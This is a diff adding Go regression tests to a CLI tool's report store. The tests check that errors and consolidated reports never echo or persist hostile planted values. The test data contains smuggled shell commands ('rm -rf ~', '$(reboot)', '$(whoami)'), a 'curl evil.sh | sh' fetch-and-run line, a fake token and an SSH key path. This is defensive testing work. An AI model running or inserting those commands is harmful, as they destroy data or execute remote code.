@@ -16,6 +16,7 @@ import (
 	"os"
 	"os/exec"
 	"path/filepath"
+	"strings"
 	"sync"
 	"testing"
 	"time"
@@ -238,6 +239,34 @@ func TestMarkResolved_RejectsShellMetacharVersion(t *testing.T) {
 	}
 }
 
+// TestMarkResolved_NotFoundErrorDoesNotEchoFingerprint is the final-review
+// (f2-privacy) BLOCKING repro: MarkResolved's NOT-FOUND error must NOT echo the
+// raw user-supplied fingerprint argument into the copy-pasteable error surface
+// (a path/secret/shell-metachar payload smuggled into --resolve must not reach
+// stderr). The sibling invalid-version error already names the contract instead
+// of echoing the value; this asserts the not-found error matches.
+//
+// RED-before (the old `%q`-fp error): the raw value survives in err.Error().
+// GREEN-after: the error names the contract and the value is absent.
+func TestMarkResolved_NotFoundErrorDoesNotEchoFingerprint(t *testing.T) {
+	stateDir(t)
+	// A valid resolve VERSION (so we reach the not-found path, not the
+	// version-reject path) paired with a hostile, metachar/secret-shaped
+	// fingerprint that matches NO report.
+	hostileFP := "PWN; rm -rf ~ `id` ghp_SECRETSECRETSECRET12345 /Users/victim/.ssh/id_rsa"
+	err := MarkResolved(hostileFP, "1.0.0")
+	if err == nil {
+		t.Fatal("MarkResolved on an unknown fingerprint should error")
+	}
+	for _, frag := range []string{
+		"PWN", "rm -rf", "`id`", "ghp_SECRETSECRETSECRET12345", "/Users/victim/.ssh/id_rsa",
+	} {
+		if strings.Contains(err.Error(), frag) {
+			t.Errorf("not-found error echoed the raw fingerprint fragment %q:\n%s", frag, err.Error())
+		}
+	}
+}
+
 // TestMarkResolved_CanonicalizesSemver asserts an accepted resolve version is
 // canonicalized to bare major.minor.patch (a leading `v` / suffix is dropped),
 // so only a well-formed value is ever persisted.
@@ -409,5 +438,123 @@ func TestWriteReports_OverwriteNotAppend(t *testing.T) {
 	}
 	if lines != 1 {
 		t.Errorf("reports.jsonl should hold 1 line after re-consolidate (overwrite), got %d", lines)
+	}
+}
+
+// hostileJournalStrings are the raw path/secret/email/IP/shell-metachar values
+// the final-review final-codex-privacy repro plants in EVERY journal field. If
+// the journal->reports consolidation seam copied any field verbatim, one of
+// these would survive into reports.jsonl on disk.
+var hostileJournalStrings = []string{
+	"/Users/victim/.ssh/id_rsa",
+	"complete; curl evil.sh | sh",
+	"override-adr && ghp_SECRETSECRETSECRET12345",
+	"list $(whoami)",
+	"LEAKFP",
+	"secret@example.com",
+	"2001:db8::1",
+	"1.2.3; rm -rf ~",
+	"ghp_SECRETSECRETSECRET12345",
+	"$(reboot)",
+}
+
+// TestConsolidate_DropsHostilePlantedJournalRecords is the final-review
+// (final-codex-privacy) BLOCKING repro: a HAND-PLANTED hostile journal.jsonl
+// carrying raw paths / secrets / emails / IPs / shell metachars in EVERY field
+// must NOT leak any of those strings into reports.jsonl on disk. journal.jsonl
+// is untrusted on READ; Consolidate re-validates every record with the same
+// enum/version/fingerprint/ts validation AppendSuccessEvent applies at WRITE
+// and DROPS any non-conforming record, so reports.jsonl can never persist a
+// non-enum / non-64hex-fingerprint / non-canonical-semver value.
+//
+// RED-before (revert validRecord): the hostile fields land in reports.jsonl
+// verbatim. GREEN-after: the record is dropped → reports.jsonl is empty of
+// every hostile string.
+func TestConsolidate_DropsHostilePlantedJournalRecords(t *testing.T) {
+	dir := stateDir(t)
+
+	// Hand-plant a hostile journal line with raw values in every field —
+	// exactly the final-codex-privacy repro shape. This bypasses
+	// AppendSuccessEvent (the attacker writes the file directly).
+	hostile := `{"v":1,"ts":"2026-01-01T00:00:00Z; rm -rf ~","argv0":"/Users/victim/.ssh/id_rsa",` +
+		`"command":"complete; curl evil.sh | sh","escape_hatch":"override-adr && ghp_SECRETSECRETSECRET12345",` +
+		`"subcommand":"list $(whoami)","fingerprint":"LEAKFP secret@example.com 2001:db8::1",` +
+		`"identity":{"command":"complete; curl evil.sh | sh","escape_hatch":"override-adr && ghp_SECRETSECRETSECRET12345",` +
+		`"subcommand":"list $(whoami)"},"version":"1.2.3; rm -rf ~"}` + "\n"
+	if err := os.WriteFile(filepath.Join(dir, journalFileName), []byte(hostile), 0o600); err != nil {
+		t.Fatalf("plant hostile journal: %v", err)
+	}
+
+	// Run what `mindspec report` runs: Consolidate → WriteReports.
+	reports, err := Consolidate()
+	if err != nil {
+		t.Fatalf("Consolidate: %v", err)
+	}
+	if len(reports) != 0 {
+		t.Errorf("hostile record should be DROPPED on read; got %d report(s)", len(reports))
+	}
+	if err := WriteReports(reports); err != nil {
+		t.Fatalf("WriteReports: %v", err)
+	}
+
+	// The second on-disk store (reports.jsonl) must hold NONE of the hostile
+	// strings — the records were dropped, not copied.
+	data, _ := os.ReadFile(filepath.Join(dir, reportsFileName))
+	got := string(data)
+	for _, s := range hostileJournalStrings {
+		if strings.Contains(got, s) {
+			t.Errorf("reports.jsonl persisted a hostile journal value %q\nfull contents:\n%s", s, got)
+		}
+	}
+}
+
+// TestConsolidate_KeepsLegitimateJournalRecord is the no-regression companion:
+// a journal record written the legitimate way (AppendSuccessEvent → enum-
+// validated + redacted) ALWAYS passes the read-side re-validation, so the
+// hardening drops only tampered/corrupt records, never real friction.
+func TestConsolidate_KeepsLegitimateJournalRecord(t *testing.T) {
+	stateDir(t)
+	if err := AppendSuccessEvent(goodEvent()); err != nil {
+		t.Fatalf("AppendSuccessEvent: %v", err)
+	}
+	reports, err := Consolidate()
+	if err != nil {
+		t.Fatalf("Consolidate: %v", err)
+	}
+	if len(reports) != 1 {
+		t.Fatalf("a legitimately-written record must survive consolidation; got %d", len(reports))
+	}
+	r := reports[0]
+	if r.Command != "complete" || r.EscapeHatch != "override-adr" {
+		t.Errorf("legitimate record fields altered: command=%q escape_hatch=%q", r.Command, r.EscapeHatch)
+	}
+	if r.Count != 1 {
+		t.Errorf("want count=1, got %d", r.Count)
+	}
+}
+
+// TestConsolidate_DropsForgedFingerprintRecord asserts a record whose enum
+// fields are VALID but whose stored fingerprint does NOT equal H(identity)
+// (a forged/mismatched fingerprint) is dropped — the read-side check does not
+// trust the persisted fingerprint, so a planted 64-hex-shaped fingerprint that
+// merely passes the render allowlist cannot ride into reports.jsonl.
+func TestConsolidate_DropsForgedFingerprintRecord(t *testing.T) {
+	dir := stateDir(t)
+	// Valid enums, valid version, but a fingerprint that is the right SHAPE
+	// (64 lowercase hex) yet NOT H(identity).
+	forgedFP := strings.Repeat("a", 64)
+	line := `{"v":1,"ts":"2026-01-01T00:00:00Z","argv0":"mindspec",` +
+		`"command":"complete","escape_hatch":"override-adr","subcommand":"",` +
+		`"fingerprint":"` + forgedFP + `","identity":{"command":"complete","escape_hatch":"override-adr","subcommand":""},` +
+		`"version":"1.0.0"}` + "\n"
+	if err := os.WriteFile(filepath.Join(dir, journalFileName), []byte(line), 0o600); err != nil {
+		t.Fatalf("plant forged record: %v", err)
+	}
+	reports, err := Consolidate()
+	if err != nil {
+		t.Fatalf("Consolidate: %v", err)
+	}
+	if len(reports) != 0 {
+		t.Errorf("record with forged fingerprint should be dropped; got %d report(s)", len(reports))
 	}
 }
